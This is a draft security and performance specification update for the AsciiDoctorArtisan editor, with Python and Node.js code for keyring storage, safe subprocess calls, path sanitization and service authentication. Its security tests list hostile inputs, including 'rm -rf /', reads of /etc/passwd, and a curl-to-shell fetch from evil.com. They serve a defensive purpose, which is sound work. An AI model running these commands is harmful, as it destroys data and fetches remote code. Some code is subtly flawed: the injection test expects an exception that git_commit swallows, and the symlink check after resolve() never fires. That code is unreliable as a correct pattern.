# AsciiDoctorArtisan Specification Updates v1.1

**Update Date**: 2025-10-23
**Previous Version**: v1.0.0-beta
**Update Type**: Security & Performance Fixes (CRITICAL)
**Status**: DRAFT - Requires Review

---

## Executive Summary

This document outlines critical updates to the AsciiDoctorArtisan specification based on comprehensive security and architecture analysis. These updates address **3 critical**, **7 high**, and **11 medium** severity findings that must be resolved before production deployment.

### Key Changes

1. **Security Hardening**
   - API key management moved to OS keyring
   - Command injection prevention enforced
   - Path traversal protection strengthened
   - Node.js service authentication added

2. **Performance Specification Corrections**
   - Preview debouncing: 250ms → **350ms** (spec compliance)
   - Preview total latency: 250ms → **500ms** (realistic)
   - Document size limit: 10,000 → **25,000 lines** with performance testing
   - Memory limit: 500MB → **1.5GB** maximum

3. **Architecture Improvements**
   - Worker cancellation mechanism added
   - Incremental rendering specified
   - Thread pool for workers
   - Module structure enforcement

---

## SECTION 1: CRITICAL SECURITY UPDATES

### 1.1 API Key Management (NEW FR-060)

**REPLACE** current API key handling with secure storage:

#### OLD Specification (REMOVE):
```
Setup Requirements:
3. Copy `.env.example` to `.env` and add Anthropic API key
```

#### NEW Specification (ADD):

**FR-060: Secure API Key Storage**
- System MUST store Anthropic API keys in OS-provided secure storage (keyring/keychain)
- System MUST NOT store API keys in plaintext files or environment variables
- System MUST prompt user for API key on first use if not found in keyring
- System MUST provide UI for API key management (view status, update, remove)
- System MUST encrypt API keys at rest using OS-provided encryption
- System MUST support API key rotation without application restart

**Implementation Requirements**:

```python
# Python: Use keyring library
import keyring

KEYRING_SERVICE = "AsciiDoctorArtisan"
KEYRING_USERNAME = "anthropic_api_key"

def get_api_key() -> Optional[str]:
    """Retrieve API key from OS keyring."""
    try:
        key = keyring.get_password(KEYRING_SERVICE, KEYRING_USERNAME)
        if not key:
            # Prompt user via dialog
            key = prompt_for_api_key()
            if key:
                set_api_key(key)
        return key
    except keyring.errors.KeyringError as e:
        logger.error(f"Keyring access failed: {e}")
        return None

def set_api_key(api_key: str) -> bool:
    """Store API key in OS keyring."""
    try:
        keyring.set_password(KEYRING_SERVICE, KEYRING_USERNAME, api_key)
        return True
    except keyring.errors.KeyringError as e:
        logger.error(f"Failed to store API key: {e}")
        return False

def delete_api_key() -> bool:
    """Remove API key from keyring."""
    try:
        keyring.delete_password(KEYRING_SERVICE, KEYRING_USERNAME)
        return True
    except keyring.errors.PasswordDeleteError:
        return False
```

```javascript
// Node.js: Use keytar library
const keytar = require('keytar');

const SERVICE_NAME = 'AsciiDoctorArtisan';
const ACCOUNT_NAME = 'anthropic_api_key';

async function getApiKey() {
    try {
        const key = await keytar.getPassword(SERVICE_NAME, ACCOUNT_NAME);
        if (!key) {
            throw new Error('API key not found in keyring');
        }
        return key;
    } catch (error) {
        console.error('Failed to retrieve API key:', error);
        throw error;
    }
}

async function setApiKey(apiKey) {
    await keytar.setPassword(SERVICE_NAME, ACCOUNT_NAME, apiKey);
}
```

**Migration Path**:
1. On first launch with v1.1, detect `.env` file
2. Read API key from `.env`
3. Store in OS keyring
4. Delete `.env` file (with user confirmation)
5. Log migration completion

**Dependencies** (ADD to requirements):
- Python: `keyring>=24.0.0`
- Node.js: `keytar@^7.9.0`

---

### 1.2 Command Injection Prevention (UPDATE FR-023 through FR-029)

**CRITICAL CHANGE**: All subprocess calls MUST use parameterized arguments.

#### NEW FR-061: Subprocess Security

**FR-061: Secure Subprocess Execution**
- System MUST NEVER use `shell=True` with subprocess module
- System MUST use parameterized argument lists for all external commands
- System MUST validate and sanitize all user inputs before passing to subprocess
- System MUST implement allowlists for command options where applicable
- System MUST log all subprocess invocations for security auditing
- System MUST set resource limits (timeout, memory) on all subprocesses

**Git Operations - Security Requirements**:

```python
# MANDATORY PATTERN for all Git operations
import subprocess
from pathlib import Path
from typing import List, Optional

def safe_git_operation(args: List[str], cwd: Path, timeout: int = 30) -> subprocess.CompletedProcess:
    """
    Execute Git command safely with parameterized arguments.

    Args:
        args: Git command arguments (e.g., ['commit', '-m', 'message'])
        cwd: Working directory (must be validated)
        timeout: Command timeout in seconds

    Returns:
        CompletedProcess instance

    Raises:
        subprocess.TimeoutExpired: Command exceeded timeout
        subprocess.CalledProcessError: Git command failed
        ValueError: Invalid arguments detected
    """
    # Validate working directory
    if not cwd.is_dir():
        raise ValueError(f"Invalid working directory: {cwd}")

    # Build command with 'git' prefix
    cmd = ['git'] + args

    # NEVER use shell=True
    # ALWAYS use list of arguments
    try:
        result = subprocess.run(
            cmd,
            cwd=str(cwd),
            check=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            # NO shell=True!
        )
        logger.info(f"Git command succeeded: {' '.join(cmd)}")
        return result
    except subprocess.CalledProcessError as e:
        logger.error(f"Git command failed: {e.stderr}")
        raise
    except subprocess.TimeoutExpired as e:
        logger.error(f"Git command timeout: {' '.join(cmd)}")
        raise

# CORRECT usage examples:
def git_commit(file_path: Path, commit_msg: str, repo_path: Path) -> bool:
    """Safely commit file with user-provided message."""
    # Validate commit message
    if not commit_msg or not commit_msg.strip():
        raise ValueError("Commit message cannot be empty")
    if len(commit_msg) > 5000:
        raise ValueError("Commit message too long (max 5000 chars)")

    try:
        # Stage file
        safe_git_operation(['add', str(file_path)], repo_path)

        # Commit (message passed as argument, NOT interpolated into string)
        safe_git_operation(['commit', '-m', commit_msg], repo_path)

        return True
    except Exception as e:
        logger.error(f"Git commit failed: {e}")
        return False

def git_push(repo_path: Path, remote: str = 'origin', branch: str = 'main') -> bool:
    """Safely push to remote."""
    # Validate inputs
    if not remote.replace('-', '').replace('_', '').isalnum():
        raise ValueError("Invalid remote name")

    try:
        safe_git_operation(['push', remote, branch], repo_path, timeout=60)
        return True
    except Exception as e:
        logger.error(f"Git push failed: {e}")
        return False
```

**Pandoc Operations - Security Requirements**:

```python
# MANDATORY PATTERN for Pandoc operations
ALLOWED_PANDOC_FORMATS = {
    'input': ['asciidoc', 'markdown', 'html', 'docx', 'latex', 'rst', 'org', 'textile'],
    'output': ['asciidoc', 'markdown', 'html', 'docx', 'pdf']
}

ALLOWED_PANDOC_OPTIONS = {
    'standalone': lambda x: x in [True, False],
    'wrap': lambda x: x in ['auto', 'none', 'preserve'],
    'columns': lambda x: isinstance(x, int) and 0 < x <= 500
}

def safe_pandoc_convert(
    source_path: Path,
    target_path: Path,
    from_format: str,
    to_format: str,
    options: Optional[Dict[str, Any]] = None
) -> bool:
    """
    Safely execute Pandoc conversion.

    Args:
        source_path: Source file (must exist)
        target_path: Target file (must be writable location)
        from_format: Source format (must be in allowlist)
        to_format: Target format (must be in allowlist)
        options: Optional conversion options (validated against allowlist)

    Returns:
        True if conversion succeeded

    Raises:
        ValueError: Invalid format or options
        subprocess.CalledProcessError: Pandoc failed
    """
    # Validate formats
    if from_format not in ALLOWED_PANDOC_FORMATS['input']:
        raise ValueError(f"Invalid input format: {from_format}")
    if to_format not in ALLOWED_PANDOC_FORMATS['output']:
        raise ValueError(f"Invalid output format: {to_format}")

    # Validate paths
    if not source_path.exists():
        raise ValueError(f"Source file not found: {source_path}")

    # Build command with validated arguments
    cmd = [
        'pandoc',
        str(source_path),
        '--from', from_format,
        '--to', to_format,
        '--output', str(target_path)
    ]

    # Add validated options
    if options:
        for key, value in options.items():
            if key not in ALLOWED_PANDOC_OPTIONS:
                logger.warning(f"Ignoring unknown Pandoc option: {key}")
                continue
            if not ALLOWED_PANDOC_OPTIONS[key](value):
                logger.warning(f"Ignoring invalid value for {key}: {value}")
                continue
            cmd.extend([f'--{key}', str(value)])

    try:
        result = subprocess.run(
            cmd,
            check=True,
            capture_output=True,
            text=True,
            timeout=120  # 2 minute timeout
        )
        logger.info(f"Pandoc conversion succeeded: {source_path} -> {target_path}")
        return True
    except subprocess.CalledProcessError as e:
        logger.error(f"Pandoc conversion failed: {e.stderr}")
        raise
```

---

### 1.3 Path Traversal Protection (UPDATE Data Model)

**CRITICAL FIX**: Current path sanitization has logical error.

#### OLD Implementation (BROKEN):
```python
def sanitize_path(path_str: str) -> Optional[Path]:
    path = Path(path_str).resolve()
    if ".." in path.parts:  # BUG: resolve() already removes ".."
        return None
    return path
```

#### NEW Implementation (CORRECT):

```python
from pathlib import Path
from typing import Optional, Set
import logging

logger = logging.getLogger(__name__)

# Define allowed base directories
ALLOWED_BASE_DIRS = {
    Path.home(),
    Path.home() / "Documents",
    Path.home() / "Desktop",
    Path.cwd()
}

def add_allowed_directory(path: Path) -> None:
    """Add directory to allowed list (e.g., opened project directory)."""
    if path.is_dir():
        ALLOWED_BASE_DIRS.add(path.resolve())

def sanitize_path(
    path_str: str,
    base_dir: Optional[Path] = None,
    must_exist: bool = False
) -> Optional[Path]:
    """
    Sanitize and validate file path with proper boundary checks.

    Args:
        path_str: User-provided path string
        base_dir: Optional base directory to restrict access to
        must_exist: If True, path must exist on filesystem

    Returns:
        Resolved path if valid and within boundaries, None otherwise

    Security:
        - Resolves to absolute path
        - Checks if path is within allowed boundaries
        - Detects and handles symbolic links
        - Prevents directory traversal attacks
        - Logs all rejection events for security monitoring
    """
    try:
        # Resolve to absolute path (follows symlinks)
        path = Path(path_str).resolve(strict=False)

        # Check existence if required
        if must_exist and not path.exists():
            logger.warning(f"Path does not exist: {path}")
            return None

        # If path is a symlink, check if target is within boundaries
        if path.is_symlink():
            target = path.readlink()
            logger.info(f"Symbolic link detected: {path} -> {target}")
            # Recursively validate symlink target
            return sanitize_path(str(target), base_dir, must_exist)

        # If base_dir specified, ensure path is within it
        if base_dir:
            base_dir = base_dir.resolve()
            try:
                # Check if path is relative to base_dir
                path.relative_to(base_dir)
            except ValueError:
                logger.warning(
                    f"Path outside base directory: {path} not in {base_dir}",
                    extra={'security_event': 'path_traversal_attempt'}
                )
                return None
        else:
            # Check against global allowed directories
            is_allowed = False
            for allowed_base in ALLOWED_BASE_DIRS:
                try:
                    path.relative_to(allowed_base)
                    is_allowed = True
                    break
                except ValueError:
                    continue

            if not is_allowed:
                logger.warning(
                    f"Path outside allowed directories: {path}",
                    extra={'security_event': 'unauthorized_path_access'}
                )
                return None

        # Additional security checks
        path_str_lower = str(path).lower()

        # Reject paths to sensitive system directories
        FORBIDDEN_DIRS = ['/etc/', '/sys/', '/proc/', 'c:\\windows\\system32']
        if any(forbidden in path_str_lower for forbidden in FORBIDDEN_DIRS):
            logger.error(
                f"Attempt to access forbidden directory: {path}",
                extra={'security_event': 'forbidden_directory_access'}
            )
            return None

        return path

    except Exception as e:
        logger.error(f"Path sanitization failed: {e}", exc_info=True)
        return None

# Usage in file operations:
def open_file(file_path_str: str) -> Optional[str]:
    """Safely open file with path validation."""
    path = sanitize_path(file_path_str, must_exist=True)
    if not path:
        raise ValueError("Invalid or unauthorized file path")

    if not path.is_file():
        raise ValueError("Path is not a file")

    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        logger.error(f"Failed to read file {path}: {e}")
        raise
```

---

### 1.4 Node.js Service Authentication (NEW FR-062)

**CRITICAL**: Add authentication to Claude AI service.

**FR-062: Claude Service Authentication**
- System MUST generate random authentication token on service startup
- System MUST require `X-API-Token` header on all API requests
- System MUST reject requests without valid token (401 Unauthorized)
- System MUST pass token from Node.js service to Python client securely
- System MUST support token regeneration on service restart
- System MUST implement rate limiting per token/IP address

**Node.js Service Security Updates**:

```javascript
// claude-integration/server.js (UPDATED)
const express = require('express');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');

// Generate secure random token on startup
const API_TOKEN = crypto.randomBytes(32).toString('hex');
const TOKEN_FILE = path.join(__dirname, '.api-token');

// Write token to file (Python client will read it)
fs.writeFileSync(TOKEN_FILE, API_TOKEN, { mode: 0o600 });
console.log(`API Token generated and saved to ${TOKEN_FILE}`);

const app = express();
app.use(express.json());

// Authentication middleware
function authenticate(req, res, next) {
    const token = req.headers['x-api-token'];

    if (!token) {
        return res.status(401).json({
            error: 'Unauthorized',
            message: 'Missing X-API-Token header'
        });
    }

    // Constant-time comparison to prevent timing attacks
    const providedBuffer = Buffer.from(token, 'utf8');
    const expectedBuffer = Buffer.from(API_TOKEN, 'utf8');

    if (providedBuffer.length !== expectedBuffer.length ||
        !crypto.timingSafeEqual(providedBuffer, expectedBuffer)) {
        return res.status(401).json({
            error: 'Unauthorized',
            message: 'Invalid API token'
        });
    }

    next();
}

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per windowMs
    message: {
        error: 'Too many requests',
        message: 'Rate limit exceeded. Please try again later.'
    }
});

// Apply rate limiting and authentication to all API routes
app.use('/api', limiter);
app.use('/api', authenticate);

// Health check (no auth required)
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        claudeReady: true,
        authenticated: false
    });
});

// API routes (all require authentication)
app.post('/api/generate-asciidoc', async (req, res) => {
    // ... existing implementation ...
});

// Cleanup token file on shutdown
process.on('SIGINT', () => {
    if (fs.existsSync(TOKEN_FILE)) {
        fs.unlinkSync(TOKEN_FILE);
    }
    process.exit(0);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, 'localhost', () => {  // Only bind to localhost!
    console.log(`Claude service running on http://localhost:${PORT}`);
    console.log('Service is protected with authentication');
});
```

**Python Client Updates**:

```python
# claude_client.py (UPDATED)
import requests
from pathlib import Path

class ClaudeClient:
    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.timeout = 30
        self._api_token = None

    def _load_api_token(self) -> Optional[str]:
        """Load API token from service token file."""
        token_file = Path(__file__).parent / 'claude-integration' / '.api-token'

        if not token_file.exists():
            logger.error("API token file not found. Is the Claude service running?")
            return None

        try:
            token = token_file.read_text().strip()
            if len(token) != 64:  # Should be 32 bytes hex = 64 chars
                logger.error("Invalid token format")
                return None
            return token
        except Exception as e:
            logger.error(f"Failed to read API token: {e}")
            return None

    def _get_headers(self) -> Dict[str, str]:
        """Get headers including authentication token."""
        if not self._api_token:
            self._api_token = self._load_api_token()
            if not self._api_token:
                raise RuntimeError("Claude service authentication failed")

        return {
            'X-API-Token': self._api_token,
            'Content-Type': 'application/json'
        }

    def is_available(self) -> bool:
        """Check if service is available."""
        try:
            response = self.session.get(f"{self.base_url}/health", timeout=5)
            return response.json().get('status') == 'ok'
        except Exception:
            return False

    def generate_asciidoc(self, prompt: str, context: Optional[str] = None):
        """Generate AsciiDoc with authentication."""
        try:
            response = self.session.post(
                f"{self.base_url}/api/generate-asciidoc",
                json={"prompt": prompt, "context": context},
                headers=self._get_headers(),
                timeout=self.timeout
            )

            if response.status_code == 401:
                # Token invalid, try reloading
                self._api_token = None
                raise RuntimeError("Authentication failed. Is Claude service running?")

            response.raise_for_status()
            return True, response.json().get('content', ''), ''

        except Exception as e:
            logger.error(f"Failed to generate AsciiDoc: {e}")
            return False, '', str(e)
```

---

## SECTION 2: PERFORMANCE SPECIFICATION CORRECTIONS

### 2.1 Preview Debouncing and Latency (UPDATE FR-002, FR-005)

**ISSUE**: Current spec has conflicting requirements.

#### REMOVE:
```
FR-002: System MUST display live HTML preview updated within 250ms of user input
FR-005: System MUST debounce preview updates to prevent UI blocking
```

#### REPLACE WITH:

**FR-002: Preview Update Latency (CORRECTED)**
- System MUST start preview rendering within **350ms** of user stopping input (debounce period)
- System MUST complete preview rendering within **500ms total** from last user input for documents under 10,000 lines
- System MUST complete preview rendering within **1000ms total** for documents between 10,000-25,000 lines
- System MUST display progress indicator if rendering exceeds 500ms
- System MUST allow user to disable live preview for very large documents

**FR-005: Preview Debouncing (CORRECTED)**
- System MUST implement adaptive debouncing based on document size:
  - **350ms** for documents under 10,000 lines
  - **500ms** for documents 10,000-20,000 lines
  - **750ms** for documents 20,000-25,000 lines
- System MUST cancel obsolete preview renders when new input arrives
- System MUST track render job IDs to prevent out-of-order updates
- System MUST provide manual refresh button for immediate preview update

**Implementation**:

```python
class AdaptivePreviewManager:
    def __init__(self):
        self.debounce_timer = QTimer()
        self.debounce_timer.setSingleShot(True)
        self.debounce_timer.timeout.connect(self._start_render)

        self.current_job_id = 0
        self.active_worker = None
        self.last_render_time = 0

    def get_debounce_delay(self, line_count: int) -> int:
        """Calculate adaptive debounce delay based on document size."""
        if line_count < 10000:
            return 350  # Fast for small docs
        elif line_count < 20000:
            return 500  # Medium for large docs
        else:
            return 750  # Slow for very large docs

    def request_preview_update(self, content: str):
        """Request preview update with adaptive debouncing."""
        line_count = content.count('\n') + 1

        # Get adaptive delay
        delay_ms = self.get_debounce_delay(line_count)

        # Restart debounce timer
        self.debounce_timer.stop()
        self.debounce_timer.setInterval(delay_ms)
        self.debounce_timer.start()

        # Store content for rendering
        self.pending_content = content

    def _start_render(self):
        """Start rendering after debounce period."""
        # Cancel previous worker
        if self.active_worker and self.active_worker.isRunning():
            self.active_worker.cancel()
            self.active_worker.wait(100)

        # Increment job ID
        self.current_job_id += 1
        job_id = self.current_job_id

        # Start new worker
        start_time = time.time()
        self.active_worker = PreviewWorker(self.pending_content, job_id)
        self.active_worker.finished.connect(
            lambda html, jid: self._handle_result(html, jid, start_time)
        )
        self.active_worker.start()

    def _handle_result(self, html: str, job_id: int, start_time: float):
        """Handle preview result, only if from latest job."""
        if job_id != self.current_job_id:
            logger.debug(f"Discarding stale preview (job {job_id})")
            return

        render_time = (time.time() - start_time) * 1000
        self.last_render_time = render_time

        logger.info(f"Preview rendered in {render_time:.0f}ms")
        self.preview_pane.setHtml(html)

        # Show warning if too slow
        if render_time > 1000:
            self.show_performance_warning(render_time)
```

---

### 2.2 Document Size Limits (UPDATE FR-045, FR-046)

#### REMOVE:
```
FR-045: System MUST remain responsive when editing documents up to 25,000 lines
```

#### REPLACE WITH:

**FR-045: Document Size Limits (CORRECTED)**
- System MUST support documents up to **25,000 lines** with degraded performance warnings
- System MUST enforce maximum file size of **50MB** total
- System MUST enforce maximum line length of **10,000 characters**
- System MUST display performance warning when opening files exceeding:
  - **10,000 lines**: "Large document - preview may be slower"
  - **15,000 lines**: "Very large document - consider disabling live preview"
  - **20,000 lines**: "Extremely large document - live preview disabled by default"
- System MUST offer to disable live preview for documents exceeding 15,000 lines
- System MUST validate document size limits before opening files

**FR-046: Memory Management (NEW)**
- System MUST limit maximum memory usage to **1.5GB**
- System MUST monitor memory usage and warn user if approaching limit
- System MUST implement graceful degradation when memory constrained:
  - Disable syntax highlighting for very large files
  - Disable live preview
  - Reduce undo history depth
- System MUST prevent out-of-memory crashes through proactive limits

**Performance Testing Requirements** (NEW):
- System MUST be performance-tested with the following document sizes:
  - 1,000 lines (baseline - <100ms render)
  - 5,000 lines (<200ms render)
  - 10,000 lines (<300ms render)
  - 15,000 lines (<500ms render)
  - 20,000 lines (<750ms render)
  - 25,000 lines (<1000ms render)
- System MUST maintain memory usage under 1.5GB for 25,000 line documents
- System MUST not freeze UI for more than 100ms during any operation

**Implementation**:

```python
# Document size validation
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
MAX_LINES = 25000
MAX_LINE_LENGTH = 10000

class DocumentSizeValidator:
    @staticmethod
    def validate(file_path: Path) -> Tuple[bool, str, Dict[str, Any]]:
        """
        Validate document size and provide performance recommendations.

        Returns:
            (is_valid, message, metadata)
        """
        # Check file size
        size = file_path.stat().st_size
        if size > MAX_FILE_SIZE:
            return False, f"File too large: {size/1024/1024:.1f}MB (max 50MB)", {}

        # Count lines and check line lengths
        line_count = 0
        max_line_len = 0
        long_lines = []

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for i, line in enumerate(f, 1):
                    line_count += 1

                    if line_count > MAX_LINES:
                        return False, f"Too many lines: >{MAX_LINES}", {}

                    line_len = len(line)
                    if line_len > max_line_len:
                        max_line_len = line_len

                    if line_len > MAX_LINE_LENGTH:
                        long_lines.append(i)
                        if len(long_lines) > 10:  # More than 10 long lines
                            return False, f"Line {i} too long: {line_len} chars (max {MAX_LINE_LENGTH})", {}

        except Exception as e:
            return False, f"Validation error: {e}", {}

        # Determine performance level
        metadata = {
            'line_count': line_count,
            'max_line_length': max_line_len,
            'file_size_mb': size / 1024 / 1024,
            'performance_level': 'good',
            'recommendation': ''
        }

        if line_count > 20000:
            metadata['performance_level'] = 'critical'
            metadata['recommendation'] = 'Disable live preview recommended'
        elif line_count > 15000:
            metadata['performance_level'] = 'poor'
            metadata['recommendation'] = 'Consider disabling live preview'
        elif line_count > 10000:
            metadata['performance_level'] = 'fair'
            metadata['recommendation'] = 'Preview may be slower'

        return True, "OK", metadata

# Usage in file open:
def open_document(file_path_str: str) -> bool:
    """Open document with size validation."""
    path = sanitize_path(file_path_str, must_exist=True)
    if not path:
        return False

    # Validate size
    valid, message, metadata = DocumentSizeValidator.validate(path)

    if not valid:
        QMessageBox.critical(None, "Cannot Open File", message)
        return False

    # Show performance warning if needed
    if metadata.get('performance_level') in ['poor', 'critical']:
        response = QMessageBox.warning(
            None,
            "Large Document",
            f"This document has {metadata['line_count']:,} lines.\\n"
            f"{metadata['recommendation']}\\n\\n"
            f"Continue opening?",
            QMessageBox.Yes | QMessageBox.No
        )
        if response == QMessageBox.No:
            return False

    # Load document...
    return True
```

---

## SECTION 3: ARCHITECTURE IMPROVEMENTS

### 3.1 Worker Cancellation (NEW FR-063)

**FR-063: Cancellable Background Operations**
- System MUST support cancellation of all background worker operations
- System MUST provide visual indication of cancellable operations
- System MUST clean up worker resources immediately upon cancellation
- System MUST not apply results from cancelled operations
- System MUST implement cancellation for:
  - Preview rendering
  - Pandoc conversions
  - Git operations
  - Claude AI requests

**Implementation**:

```python
class CancellableWorker(QThread):
    """Base class for all cancellable worker threads."""

    finished = pyqtSignal(object, int)  # result, job_id
    progress = pyqtSignal(int)  # progress percentage
    cancelled = pyqtSignal(int)  # job_id

    def __init__(self, job_id: int):
        super().__init__()
        self.job_id = job_id
        self._cancelled = False
        self._lock = threading.Lock()

    def cancel(self):
        """Request cancellation of this worker."""
        with self._lock:
            self._cancelled = True
        logger.info(f"Worker {self.job_id} cancellation requested")

    def is_cancelled(self) -> bool:
        """Check if cancellation has been requested."""
        with self._lock:
            return self._cancelled

    def run(self):
        """Override in subclasses, check is_cancelled() periodically."""
        raise NotImplementedError

class PreviewWorker(CancellableWorker):
    """Cancellable preview rendering worker."""

    def __init__(self, content: str, job_id: int):
        super().__init__(job_id)
        self.content = content

    def run(self):
        """Render preview with cancellation checks."""
        try:
            # Split content into chunks for cancellation checking
            lines = self.content.split('\\n')
            chunks = [lines[i:i+1000] for i in range(0, len(lines), 1000)]

            rendered_parts = []
            for i, chunk in enumerate(chunks):
                # Check cancellation before each chunk
                if self.is_cancelled():
                    logger.info(f"Preview render {self.job_id} cancelled at chunk {i}")
                    self.cancelled.emit(self.job_id)
                    return

                # Render chunk
                chunk_text = '\\n'.join(chunk)
                part = render_asciidoc(chunk_text)
                rendered_parts.append(part)

                # Update progress
                progress = int((i + 1) / len(chunks) * 100)
                self.progress.emit(progress)

            if not self.is_cancelled():
                full_html = '\\n'.join(rendered_parts)
                self.finished.emit(full_html, self.job_id)

        except Exception as e:
            logger.error(f"Preview render error: {e}")
            self.finished.emit(None, self.job_id)
```

---

### 3.2 Module Structure Enforcement (UPDATE Constitution VI)

**CRITICAL**: 101KB monolithic file violates maintainability principles.

**NEW Architecture Requirement**:

**AR-001: Module Structure**
- NO source file SHALL exceed **500 lines** of code
- Main application MUST be split into logical modules:
  - `ui/` - User interface components
  - `workers/` - Background thread workers
  - `core/` - Business logic and models
  - `git/` - Git operations
  - `conversion/` - Pandoc integration
  - `claude/` - Claude AI integration
- Each module MUST have clear responsibilities (Single Responsibility Principle)
- Modules MUST communicate through well-defined interfaces

**Recommended Structure**:

```
asciidoctor_artisan/
├── __init__.py
├── app.py                      # Application entry point (<200 lines)
│
├── ui/
│   ├── __init__.py
│   ├── main_window.py          # Main window class (<300 lines)
│   ├── editor_widget.py        # Editor pane (<200 lines)
│   ├── preview_widget.py       # Preview pane (<200 lines)
│   ├── dialogs.py              # All dialogs (<300 lines)
│   └── themes.py               # Theme management (<150 lines)
│
├── workers/
│   ├── __init__.py
│   ├── base.py                 # CancellableWorker base class (<150 lines)
│   ├── preview_worker.py       # Preview rendering (<200 lines)
│   ├── git_worker.py           # Git operations (<200 lines)
│   └── pandoc_worker.py        # Pandoc conversions (<200 lines)
│
├── core/
│   ├── __init__.py
│   ├── document.py             # Document model (<200 lines)
│   ├── settings.py             # Settings management (<300 lines)
│   ├── asciidoc_api.py         # AsciiDoc rendering (<250 lines)
│   └── validation.py           # Path sanitization, validators (<300 lines)
│
├── git/
│   ├── __init__.py
│   └── repository.py           # Git operations (<400 lines)
│
├── conversion/
│   ├── __init__.py
│   └── pandoc.py               # Pandoc integration (<400 lines)
│
└── claude/
    ├── __init__.py
    └── client.py               # Claude AI client (<300 lines)
```

**Migration Requirement**: This refactoring is MANDATORY before v1.1 release.

---

## SECTION 4: ADDITIONAL REQUIREMENTS

### 4.1 Security Logging (NEW FR-064)

**FR-064: Security Event Logging**
- System MUST log all security-relevant events to dedicated security log
- System MUST implement log sanitization to prevent sensitive data exposure
- System MUST set restrictive permissions on log files (0600)
- System MUST log the following security events:
  - Path traversal attempts
  - Unauthorized file access attempts
  - Subprocess execution (command + arguments)
  - API authentication failures
  - API key access (success/failure, no key values)
  - File permission errors
- System MUST NOT log sensitive data:
  - API keys or passwords
  - Full file contents
  - Personal identifiable information (PII)

**Implementation**: See Security Analysis report Section 1.6

---

### 4.2 Dependency Scanning (NEW)

**Add to CI/CD Requirements**:

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, dev]
  pull_request:
  schedule:
    - cron: '0 0 * * 0'  # Weekly on Sunday

jobs:
  python-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Python Security Scan
        uses: pypa/gh-action-pip-audit@v1
        with:
          inputs: requirements-production.txt

      - name: Bandit Security Linter
        run: |
          pip install bandit
          bandit -r . -f json -o bandit-report.json

  node-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Node.js Security Scan
        run: |
          cd claude-integration
          npm audit --audit-level=moderate

  dependency-review:
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@v3
      - uses: actions/dependency-review-action@v3
```

---

## SECTION 5: UPDATED DEPENDENCIES

### Python Dependencies (ADD to requirements.txt):

```
# Security
keyring>=24.0.0              # OS keyring for API key storage
cryptography>=41.0.0         # Encryption support

# Performance
psutil>=5.9.0                # Memory monitoring

# Development
bandit>=1.7.5                # Security linting
safety>=2.3.0                # Dependency vulnerability scanning
```

### Node.js Dependencies (ADD to package.json):

```json
{
  "dependencies": {
    "keytar": "^7.9.0",
    "express-rate-limit": "^7.1.0"
  },
  "devDependencies": {
    "npm-audit-resolver": "^3.0.0"
  }
}
```

---

## SECTION 6: TESTING REQUIREMENTS

### Security Tests (MANDATORY):

```python
# tests/security/test_path_sanitization.py
def test_path_traversal_prevention():
    """Test that path traversal attacks are blocked."""
    malicious_paths = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM"
    ]

    for path in malicious_paths:
        result = sanitize_path(path)
        assert result is None, f"Path traversal not blocked: {path}"

def test_command_injection_prevention():
    """Test that command injection is prevented."""
    malicious_messages = [
        '"; rm -rf /; echo "',
        "' && cat /etc/passwd #",
        "$(curl evil.com/malware | sh)"
    ]

    for msg in malicious_messages:
        with pytest.raises((ValueError, subprocess.CalledProcessError)):
            git_commit(Path("test.adoc"), msg, Path("/tmp"))
```

---

## SECTION 7: MIGRATION PATH

### From v1.0 to v1.1:

**Phase 1: Security Hardening (Week 1-2)**
1. Implement OS keyring for API keys
2. Fix command injection vulnerabilities
3. Update path sanitization logic
4. Add Node.js service authentication

**Phase 2: Performance Updates (Week 3)**
1. Implement adaptive debouncing
2. Add document size validation
3. Implement worker cancellation
4. Add performance monitoring

**Phase 3: Architecture Refactoring (Week 4-6)**
1. Split monolithic file into modules
2. Implement module structure
3. Update imports and dependencies
4. Verify all functionality

**Phase 4: Testing & Validation (Week 7)**
1. Write security tests
2. Performance testing with large documents
3. Cross-platform validation
4. Security audit

---

## SUMMARY OF CHANGES

### Critical Security Fixes:
- ✅ API keys moved to OS keyring (FR-060)
- ✅ Command injection prevention enforced (FR-061)
- ✅ Path traversal protection fixed
- ✅ Node.js service authentication added (FR-062)

### Performance Corrections:
- ✅ Preview debouncing: 350ms (realistic)
- ✅ Total latency: 500ms (achievable)
- ✅ Document limit: 25,000 lines with testing
- ✅ Memory limit: 1.5GB maximum

### Architecture Improvements:
- ✅ Worker cancellation (FR-063)
- ✅ Module structure enforced (<500 lines/file)
- ✅ Security logging (FR-064)
- ✅ Dependency scanning in CI/CD

### New Requirements:
- FR-060: Secure API Key Storage
- FR-061: Subprocess Security
- FR-062: Claude Service Authentication
- FR-063: Cancellable Operations
- FR-064: Security Event Logging
- FR-046: Memory Management
- AR-001: Module Structure

---

**Version**: 1.1.0-DRAFT
**Status**: Pending Review
**Next Steps**:
1. Review and approve specification updates
2. Create implementation plan for v1.1
3. Begin Phase 1 (Security Hardening)
4. Update project documentation

**Review Required By**: Project Maintainer, Security Team
**Target Release**: v1.1.0 (4-6 weeks from approval)

